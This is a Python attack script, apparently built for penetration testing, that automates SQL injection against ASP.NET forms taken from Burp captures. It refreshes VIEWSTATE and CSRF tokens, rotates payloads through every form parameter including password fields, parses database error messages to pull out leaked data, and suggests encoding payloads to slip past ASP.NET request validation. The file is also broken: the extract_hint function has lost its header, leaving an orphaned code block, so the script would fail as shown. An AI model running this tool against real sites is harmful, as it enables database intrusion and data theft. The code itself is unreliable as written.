#!/usr/bin/env python3
"""
aspnet_sqli.py — ASP.NET SQL Injection Tester
Supports single request files and Burp XML exports.
Handles VIEWSTATE/EVENTVALIDATION refresh automatically.
Routes all traffic through Burp Suite.

Usage:
    # Single request, single param
    python3 aspnet_sqli.py -r req.txt -p payloads.txt

    # Single request, auto-rotate through all params
    python3 aspnet_sqli.py -r req.txt -p payloads.txt --rotate-params

    # Burp XML export, auto-rotate all params in every POST request
    python3 aspnet_sqli.py -x burp_export.xml -p payloads.txt --rotate-params
"""

import argparse
import base64
import html as htmlmod
import re
import sys
import time
import urllib.parse
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Colours ───────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_TOKEN_FIELDS = [
    "__VIEWSTATE",
    "__EVENTVALIDATION",
    "__VIEWSTATEGENERATOR",
    "__EVENTTARGET",
    "__EVENTARGUMENT",
]

# Params that are never worth injecting into
SKIP_PARAM_SUFFIXES = (
    "$ctl08",   # submit buttons
    "$Button",
    "$Submit",
    "DXScript",
    "DXCss",
)


# ── Parsed request ────────────────────────────────────────────────────────────
@dataclass
class ParsedRequest:
    method:  str
    path:    str
    host:    str
    scheme:  str
    headers: dict
    cookies: dict
    body:    str
    params:  dict
    label:   str = ""   # human-readable source label for reporting


def full_url(req: ParsedRequest) -> str:
    return f"{req.scheme}://{req.host}{req.path}"


def _parse_raw_request(raw: str, scheme: str = "https",
                        label: str = "") -> ParsedRequest:
    """Parse a raw HTTP request string into a ParsedRequest."""
    raw = raw.replace("\r\n", "\n").replace("\r", "\n")
    head, body = (raw.split("\n\n", 1) + [""])[:2]

    lines = head.splitlines()
    parts = lines[0].strip().split()
    method = parts[0].upper() if parts else "GET"
    path   = parts[1] if len(parts) > 1 else "/"

    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()

    host = headers.pop("Host", "")

    cookies = {}
    cookie_str = headers.pop("Cookie", "")
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()

    for auto in ("Content-Length", "Content-Type", "Connection",
                 "Accept-Encoding"):
        headers.pop(auto, None)

    body = body.strip()
    params = {}
    if body:
        for kv in body.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                params[urllib.parse.unquote_plus(k)] = \
                    urllib.parse.unquote_plus(v)
            else:
                params[urllib.parse.unquote_plus(kv)] = ""

    return ParsedRequest(
        method=method, path=path, host=host, scheme=scheme,
        headers=headers, cookies=cookies, body=body,
        params=params, label=label or path,
    )


def parse_request_file(path: str, scheme: str = "https") -> ParsedRequest:
    with open(path, "rb") as f:
        raw = f.read().decode("utf-8", errors="replace")
    return _parse_raw_request(raw, scheme=scheme, label=path)


# ── Burp XML parser ───────────────────────────────────────────────────────────
def parse_burp_xml(xml_path: str,
                   methods: Optional[list[str]] = None,
                   min_params: int = 1) -> list[ParsedRequest]:
    """
    Parse a Burp Suite XML export (Save items → XML).
    Returns POST requests that have at least min_params body params.
    """
    methods = [m.upper() for m in (methods or ["POST", "PUT", "PATCH"])]

    try:
        tree = ET.parse(xml_path)
    except ET.ParseError as e:
        print(red(f"[!] Failed to parse XML: {e}"))
        sys.exit(1)

    root = tree.getroot()
    requests_found = []
    items = root.findall("item")

    print(f"[*] Burp XML: {len(items)} items found in {xml_path}")

    for i, item in enumerate(items, 1):
        # Pull metadata
        method   = (item.findtext("method")   or "").upper()
        protocol = (item.findtext("protocol") or "https").lower()
        host     = (item.findtext("host")     or "")
        path     = (item.findtext("path")     or "/")

        if method not in methods:
            continue

        # Decode request
        req_el = item.find("request")
        if req_el is None or not req_el.text:
            continue

        raw_bytes = req_el.text.strip()
        if req_el.get("base64") == "true":
            try:
                raw_bytes = base64.b64decode(raw_bytes).decode(
                    "utf-8", errors="replace")
            except Exception:
                continue
        else:
            raw_bytes = raw_bytes

        label = f"item#{i} {method} {host}{path}"
        req   = _parse_raw_request(raw_bytes, scheme=protocol, label=label)

        # Override host/scheme from XML metadata if request line is missing them
        if not req.host:
            req.host   = host
            req.scheme = protocol

        if len(req.params) < min_params:
            continue

        requests_found.append(req)

    print(f"[*] {len(requests_found)} {'/'.join(methods)} requests "
          f"with ≥{min_params} body params\n")
    return requests_found


# ── Token extraction ──────────────────────────────────────────────────────────
def extract_tokens(html_text: str, token_fields: list[str]) -> dict:
    tokens = {}
    for f in token_fields:
        for pattern in [
            rf'<input[^>]+name=["\']?{re.escape(f)}["\']?[^>]+'
            rf'value=["\']([^"\']*)["\']',
            rf'<input[^>]+value=["\']([^"\']*)["\'][^>]+'
            rf'name=["\']?{re.escape(f)}["\']?',
        ]:
            m = re.search(pattern, html_text, re.IGNORECASE)
            if m:
                tokens[f] = m.group(1)
                break
    return tokens


def get_fresh_tokens(session: requests.Session,
                     req: ParsedRequest,
                     token_fields: list[str],
                     timeout: int,
                     verify: bool) -> Optional[dict]:
    if not token_fields:
        return {}
    try:
        r = session.get(
            full_url(req), headers=req.headers,
            timeout=timeout, verify=verify, allow_redirects=True,
        )
        return extract_tokens(r.text, token_fields)
    except requests.RequestException as e:
        print(red(f"[!] Token refresh failed: {e}"))
        return None


# ── Injectable param discovery ────────────────────────────────────────────────
def get_injectable_params(req: ParsedRequest,
                           token_fields: list[str],
                           extra_skip: Optional[list[str]] = None) -> list[str]:
    """
    Return body params worth testing — excludes tokens, submit buttons,
    empty params, and any user-specified skips.
    """
    skip_exact = set(token_fields) | set(extra_skip or [])

    injectable = []
    for name, value in req.params.items():
        if name in skip_exact:
            continue
        if any(name.endswith(s) for s in SKIP_PARAM_SUFFIXES):
            continue
        # Skip params that look like pure ASP.NET infrastructure
        if name.startswith("DX"):
            continue
        injectable.append(name)

    return injectable


# ── Request builder ───────────────────────────────────────────────────────────
def build_body(base_params: dict,
               inject_param: str,
               payload: str,
               mirror_param: Optional[str] = None,
               overrides: Optional[dict] = None) -> dict:
    p = dict(base_params)
    if overrides:
        p.update(overrides)
    p[inject_param] = payload
    if mirror_param and mirror_param in p:
        p[mirror_param] = payload
    return p


# ── Hint extraction ───────────────────────────────────────────────────────────
def is_likely_reflection(payload: str, size_delta: int,
                          baseline_delta_per_char: float,
                          threshold: float = 0.4) -> bool:
    """
    Returns True if the size delta is close to what pure input reflection
    would produce, suggesting the payload text is echoed in the response
    rather than causing a genuine SQL differential.

    baseline_delta_per_char: bytes-per-char ratio from the first clean payload hit.
    threshold: how close to the reflection ratio to flag (0.4 = within 40%).
    """
    if baseline_delta_per_char <= 0 or not payload:
        return False
    expected = len(payload) * baseline_delta_per_char
    if expected == 0:
        return False
    ratio = abs(size_delta - expected) / expected
    return ratio < threshold



    decoded = htmlmod.unescape(body)

    checks = [
        # MSSQL conversion error — contains extracted data
        (r"Conversion failed when converting (?:the )?(?:nvarchar|varchar|"
         r"uniqueidentifier|datetime|ntext|text) value '([^']{1,500})'"
         r" to data type",
         lambda m: f"EXTRACTED(MSSQL): {m.group(1)}"),

        # MySQL XPATH extraction
        (r"XPATH syntax error: '([^']{1,300})'",
         lambda m: f"EXTRACTED(MySQL): {m.group(1)}"),

        # Oracle
        (r"(ORA-\d{4,5}[^\n<]{0,150})",
         lambda m: m.group(1).strip()),

        # PostgreSQL
        (r"(ERROR:\s+[^\n<]{0,150})",
         lambda m: m.group(1).strip()),

        # ASP.NET RequestValidation blocker
        (r"A potentially dangerous Request\.Form value",
         lambda m: "[ASP.NET RequestValidation blocked — "
                   "CHAR-encode payload or URL-encode <> chars]"),

        # Generic SQL syntax errors
        (r"(Incorrect syntax near|Unclosed quotation mark|"
         r"arithmetic overflow|Invalid column name|Invalid object name|"
         r"You have an error in your SQL syntax|"
         r"supplied argument is not a valid MySQL)[^\n<]{0,200}",
         lambda m: m.group(0).strip()),

        # Fallback
        (r"(SqlException|OleDbException|HttpRequestValidationException)"
         r"[^\n<]{0,120}",
         lambda m: f"[noise] {m.group(0).strip()}"),
    ]

    for pattern, formatter in checks:
        m = re.search(pattern, decoded, re.IGNORECASE)
        if m:
            return formatter(m)
    return ""


# ── Single HTTP injection ─────────────────────────────────────────────────────
def inject(session: requests.Session,
           req: ParsedRequest,
           params: dict,
           timeout: int,
           verify: bool) -> tuple[int, int, int, str, str]:
    try:
        t0 = time.time()
        r  = session.request(
            method=req.method, url=full_url(req),
            headers=req.headers, data=params,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        elapsed = int((time.time() - t0) * 1000)
        hint = extract_hint(r.text) if r.status_code >= 400 else ""
        return r.status_code, len(r.content), elapsed, hint, r.text
    except requests.Timeout:
        return 0, 0, timeout * 1000, "TIMEOUT", ""
    except requests.RequestException as e:
        return 0, 0, 0, str(e), ""


# ── Baseline ──────────────────────────────────────────────────────────────────
def confirm_baseline(session, req, token_fields, baseline_string,
                     timeout, verify) -> Optional[tuple[int, int]]:
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify)
    if tokens is None:
        return None

    params = dict(req.params)
    params.update(tokens)

    try:
        t0 = time.time()
        r  = session.request(
            method=req.method, url=full_url(req),
            headers=req.headers, data=params,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        elapsed = int((time.time() - t0) * 1000)
    except requests.RequestException as e:
        print(red(f"    [!] Baseline request failed: {e}"))
        return None

    sc = r.status_code
    sz = len(r.content)
    sc_str = green(str(sc)) if sc < 400 else red(str(sc))
    print(f"    Status : {sc_str}  |  Size : {sz}b  |  Time : {elapsed}ms")

    if sc >= 500:
        print(red("    [!] Baseline 500 — cookies likely expired. Re-save request."))
        return None

    if baseline_string and baseline_string not in r.text:
        snippet = r.text[:300].replace("\n", " ")
        print(yellow(f"    [!] Baseline string '{baseline_string}' not found."))
        print(yellow(f"    [!] Preview: {snippet[:200]}"))
        return None

    label = f"'{baseline_string}'" if baseline_string else "HTTP response"
    print(green(f"    [+] Baseline confirmed — {label} present."))
    return sc, sz


# ── Payload loop for one inject param ────────────────────────────────────────
def run_payload_loop(session, req, payloads, inject_param,
                     baseline_status, baseline_size,
                     token_fields, mirror_param, overrides,
                     args) -> list[tuple]:
    """
    Run all payloads against inject_param.
    Returns list of (payload_num, payload, status, size, ms, hint) hits.
    """
    hits = []
    reflection_ratio = 0.0   # bytes-per-char from first clean hit (reflection calibration)
    reflection_hits  = 0     # count of payloads flagged as reflection

    for i, payload in enumerate(payloads, 1):
        tokens = get_fresh_tokens(session, req, token_fields,
                                  args.timeout, args.verify)
        if tokens is None:
            print(yellow(f"  [{i:03d}] Token refresh failed — skipping"))
            continue

        params = build_body(req.params, inject_param, payload,
                            mirror_param=mirror_param,
                            overrides=overrides)
        params.update(tokens)

        sc, sz, ms, hint, body = inject(session, req, params,
                                         args.timeout, args.verify)

        triggered  = (sc != baseline_status) or (sz != baseline_size)
        size_delta = sz - baseline_size

        # Calibrate reflection ratio on first hit with a clean-looking payload
        reflected = False
        if triggered and size_delta != 0 and not args.no_reflection_filter:
            if reflection_ratio == 0.0 and len(payload) > 0:
                # Use first hit to calibrate bytes-per-char ratio
                reflection_ratio = abs(size_delta) / len(payload)
            elif reflection_ratio > 0:
                reflected = is_likely_reflection(
                    payload, size_delta, reflection_ratio)
                if reflected:
                    reflection_hits += 1

        result_str = (yellow("REFLECT") if reflected
                      else red("HIT    ") if triggered
                      else green("clean  "))
        sc_str     = red(str(sc)) if sc >= 400 else green(str(sc))
        delta_str  = f" Δ{size_delta:+d}b" if size_delta else ""
        display_pl = (payload[:52] + "…") if len(payload) > 52 else payload

        print(f"{i:<5} {sc_str:<17} {sz:<9} {ms:<10} "
              f"{result_str}  {display_pl}{delta_str}")

        if hint:
            print(f"       {yellow('└─ ' + hint)}")

        if triggered and args.dump and not reflected:
            decoded = htmlmod.unescape(body)
            anchor  = max(0, decoded.find("Exception Details") - 100)
            if anchor == 0:
                anchor = max(0, decoded.find("Stack Trace") - 100)
            snippet = decoded[anchor:anchor + 3000]
            print(f"\n--- DUMP ---\n{snippet}\n---\n")

        if triggered and not reflected:
            hits.append((i, payload, sc, sz, ms, hint))

        time.sleep(args.delay)

    if reflection_hits > 0:
        print(yellow(f"\n  ⚠  {reflection_hits} payloads flagged as likely "
                     f"reflection (ratio ≈ {reflection_ratio:.1f}b/char) "
                     f"— excluded from hits"))
    return hits


# ── Test a single request (one or more params) ────────────────────────────────
def test_request(session, req, payloads, args,
                 token_fields, overrides) -> list[dict]:
    """
    Test one ParsedRequest. Returns list of finding dicts.
    """
    url = full_url(req)
    print(bold(f"\n{'═'*95}"))
    print(bold(f"  {req.method} {url}"))
    print(bold(f"  Label : {req.label}"))
    print(bold(f"{'═'*95}"))

    # Determine which params to test
    if args.rotate_params:
        inject_params = get_injectable_params(
            req, token_fields, extra_skip=args.skip_param)
        if not inject_params:
            print(yellow("  [!] No injectable params found after filtering — skipping"))
            return []
        print(f"  Params to test : {inject_params}")
    else:
        inject_params = [args.inject_param]
        if args.inject_param not in req.params:
            print(yellow(f"  [!] '{args.inject_param}' not in request params — skipping"))
            print(yellow(f"  [!] Available: {list(req.params.keys())}"))
            return []

    # Baseline
    print(bold("\n[*] Confirming baseline..."))
    baseline = confirm_baseline(
        session, req, token_fields,
        args.baseline_string, args.timeout, args.verify
    )
    if not baseline:
        print(yellow("  [!] Baseline failed — skipping this request"))
        return []
    baseline_status, baseline_size = baseline

    # Warmup
    if args.warmup > 0:
        print(bold(f"\n[*] Warming up ({args.warmup} requests)..."))
        for w in range(1, args.warmup + 1):
            tokens = get_fresh_tokens(session, req, token_fields,
                                      args.timeout, args.verify) or {}
            params = build_body(req.params, inject_params[0],
                                args.warmup_payload,
                                overrides=overrides)
            params.update(tokens)
            sc, sz, ms, _, _ = inject(session, req, params,
                                       args.timeout, args.verify)
            sc_str = green(str(sc)) if sc < 400 else red(str(sc))
            delta  = sz - baseline_size
            state  = "ready" if delta != 0 and ms < 5000 else "init"
            print(f"    warmup {w}/{args.warmup}  {sc_str}  "
                  f"{sz}b  {ms}ms  Δ{delta:+d}b  [{state}]")
            time.sleep(args.delay)
            if state == "ready":
                print(green("    [+] Server ready"))
                break
        print()

    # Run payload loop for each param
    all_findings = []

    for inject_param in inject_params:
        mirror = args.mirror_param
        # Auto-detect mirror for ConfirmPassword when rotating
        if args.rotate_params and "Password" in inject_param:
            for k in req.params:
                if "Confirm" in k and "Password" in k:
                    mirror = k
                    break

        print(bold(f"\n[*] Injecting → {inject_param}"
                   + (f"  (mirror → {mirror})" if mirror else "")
                   + f"  |  {len(payloads)} payloads"))
        print(f"\n{'#':<5} {'Status':<8} {'Size':<9} {'Time(ms)':<10} "
              f"{'Result':<10} Payload")
        print("─" * 95)

        hits = run_payload_loop(
            session, req, payloads, inject_param,
            baseline_status, baseline_size,
            token_fields, mirror, overrides, args
        )

        print(f"\n  → {len(hits)}/{len(payloads)} hits on [{inject_param}]")

        if hits:
            for idx, pl, sc, sz, ms, hint in hits:
                all_findings.append({
                    "url":          url,
                    "label":        req.label,
                    "param":        inject_param,
                    "payload_num":  idx,
                    "payload":      pl,
                    "status":       sc,
                    "size":         sz,
                    "ms":           ms,
                    "hint":         hint,
                })

    return all_findings


# ── Final summary across all requests ─────────────────────────────────────────
def print_summary(all_findings: list[dict], total_requests: int):
    print(bold(f"\n\n{'█'*95}"))
    print(bold(f"  FINAL SUMMARY — {total_requests} request(s) tested"))
    print(bold(f"{'█'*95}"))

    if not all_findings:
        print(green("\n  [+] No differentials detected across all requests.\n"))
        return

    # Group by URL + param
    from collections import defaultdict
    grouped = defaultdict(list)
    for f in all_findings:
        grouped[(f["url"], f["param"])].append(f)

    print(bold(red(f"\n  [!] {len(grouped)} injectable parameter(s) found "
                   f"across {len(set(f['url'] for f in all_findings))} "
                   f"endpoint(s)\n")))

    for (url, param), findings in grouped.items():
        print(bold(f"  ┌─ {url}"))
        print(bold(f"  │  Parameter : {param}"))
        print(f"  │  Hits      : {len(findings)}")
        for f in findings[:3]:   # show first 3 hits per param
            print(f"  │  #{f['payload_num']:<4} {f['status']} | "
                  f"{f['ms']}ms | {f['size']}b")
            print(f"  │       Payload : {f['payload'][:80]}")
            if f["hint"]:
                print(f"  │       Hint    : {f['hint']}")
        if len(findings) > 3:
            print(f"  │       ... and {len(findings)-3} more hits")
        print(f"  └{'─'*60}")
    print()


# ── Main ──────────────────────────────────────────────────────────────────────
def run(args):
    proxy   = None if args.no_proxy else args.proxy
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    scheme  = "http" if args.http else "https"

    token_fields = [t.strip() for t in args.token_fields.split(",")
                    if t.strip()] if args.token_fields else DEFAULT_TOKEN_FIELDS

    overrides = {}
    for kv in args.set_param:
        if "=" in kv:
            k, v = kv.split("=", 1)
            overrides[k] = v

    print(bold(cyan("\n=== aspnet_sqli.py ===")))
    print(f"  Proxy        : {proxy or 'none'}")
    print(f"  Token fields : {token_fields or 'none (disabled)'}")
    print(f"  Rotate params: {args.rotate_params}")
    if overrides:
        print(f"  Overrides    : {overrides}")

    # Load payloads
    try:
        with open(args.payloads) as f:
            payloads = [
                ln.strip() for ln in f
                if ln.strip() and not ln.startswith("#")
            ]
        print(f"  Payloads     : {len(payloads)} loaded from {args.payloads}")
    except FileNotFoundError:
        print(red(f"[!] Payload file not found: {args.payloads}"))
        sys.exit(1)

    # Build session
    session = requests.Session()
    session.proxies.update(proxies)

    # Gather requests to test
    if args.burp_xml:
        print(f"\n[*] Parsing Burp XML: {args.burp_xml}")
        test_requests = parse_burp_xml(
            args.burp_xml,
            methods=args.xml_methods.upper().split(",") if args.xml_methods else None,
            min_params=args.min_params,
        )
        # Update session cookies from args if provided
        if args.cookies:
            for part in args.cookies.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    session.cookies.set(k.strip(), v.strip())
    else:
        test_requests = [parse_request_file(args.request, scheme=scheme)]
        session.cookies.update(test_requests[0].cookies)

    if not test_requests:
        print(red("[!] No requests to test — check filters or input file."))
        sys.exit(1)

    print(f"\n[*] Testing {len(test_requests)} request(s)\n")

    # Run
    all_findings = []
    for req in test_requests:
        # Per-request session cookies from the request itself
        if not args.burp_xml:
            session.cookies.clear()
            session.cookies.update(req.cookies)

        findings = test_request(
            session, req, payloads, args,
            token_fields, overrides
        )
        all_findings.extend(findings)

    # Final summary
    print_summary(all_findings, len(test_requests))


# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="ASP.NET SQLi tester — single request or Burp XML, "
                    "with param rotation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single request, default param
  python3 aspnet_sqli.py -r req.txt -p payloads.txt

  # Single request, rotate all params
  python3 aspnet_sqli.py -r req.txt -p payloads.txt --rotate-params

  # Burp XML — test every POST, rotate all params
  python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params

  # Burp XML — specific cookie header (if requests in XML have expired cookies)
  python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params \\
      --cookies "ARRAffinity=abc; ASP.NET_SessionId=xyz"

  # Burp XML — only test specific endpoints by filtering min params
  python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params \\
      --min-params 3

  # MVC target — custom CSRF token, no viewstate
  python3 aspnet_sqli.py -r req.txt -p payloads.txt \\
      --token-fields "__RequestVerificationToken" --inject-param "Password"

  # Web API — no tokens at all
  python3 aspnet_sqli.py -r req.txt -p payloads.txt --token-fields ""
        """
    )

    # Input — mutually exclusive
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("-r", "--request",
                     help="Raw HTTP request file (saved from Burp)")
    src.add_argument("-x", "--burp-xml",
                     help="Burp Suite XML export (Save items → XML)")

    ap.add_argument("-p", "--payloads", required=True,
                    help="Payload file — one per line, # = comment")

    # Injection control
    ap.add_argument("--inject-param",
                    default="ctl00$MainContent$Password",
                    help="Param to inject into (single-request mode without --rotate-params)")
    ap.add_argument("--rotate-params", action="store_true",
                    help="Auto-test every injectable param in the request(s)")
    ap.add_argument("--skip-param", metavar="PARAM", action="append",
                    default=[],
                    help="Param name to skip during rotation (repeatable)")
    ap.add_argument("--mirror-param", default=None,
                    help="Copy payload into this param too (e.g. ConfirmPassword). "
                         "Auto-detected for ConfirmPassword during rotation.")
    ap.add_argument("--set-param", metavar="KEY=VALUE", action="append",
                    default=[],
                    help="Override a param on every request (repeatable)")

    # Detection
    ap.add_argument("--baseline-string", default="",
                    help="Text expected in clean response. "
                         "If empty, uses status+size differential only.")

    # Token handling
    ap.add_argument("--token-fields",
                    default=",".join(DEFAULT_TOKEN_FIELDS),
                    help="Hidden fields to refresh before each request. "
                         "Pass '' to disable (MVC/API targets).")

    # Burp XML options
    ap.add_argument("--xml-methods", default="POST,PUT,PATCH",
                    help="Comma-separated HTTP methods to extract from XML "
                         "(default: POST,PUT,PATCH)")
    ap.add_argument("--min-params", type=int, default=1,
                    help="Minimum body params for a request to be tested "
                         "from XML (default: 1)")
    ap.add_argument("--cookies", default="",
                    help="Cookie string to apply to all XML requests "
                         "(overrides cookies in individual requests)")

    # Warmup
    ap.add_argument("--warmup", type=int, default=0,
                    help="Priming requests before payload loop (default: 0)")
    ap.add_argument("--warmup-payload", default="warmup'",
                    help="Payload used during warmup (default: warmup')")

    # Network
    ap.add_argument("--proxy",    default="http://127.0.0.1:8080")
    ap.add_argument("--no-proxy", action="store_true",
                    help="Bypass proxy, send directly to target")
    ap.add_argument("--http",     action="store_true",
                    help="Use http:// instead of https://")
    ap.add_argument("--verify",   action="store_true",
                    help="Enable SSL verification (off by default for Burp CA)")
    ap.add_argument("--timeout",  type=int,   default=90)
    ap.add_argument("--delay",    type=float, default=0.5,
                    help="Seconds between requests (default: 0.5)")

    # Output
    ap.add_argument("--no-reflection-filter", action="store_true",
                    help="Disable reflection detection — show all size differentials "
                         "even if they track with payload length")
    ap.add_argument("--dump", action="store_true",
                    help="Print Exception Details section on every HIT")

    args = ap.parse_args()

    # Validate
    if not args.burp_xml and not args.request:
        ap.error("Provide either -r (request file) or -x (Burp XML)")
    if args.burp_xml and not args.rotate_params and not args.inject_param:
        ap.error("With -x, use --rotate-params or --inject-param")

    run(args)


if __name__ == "__main__":
    main()
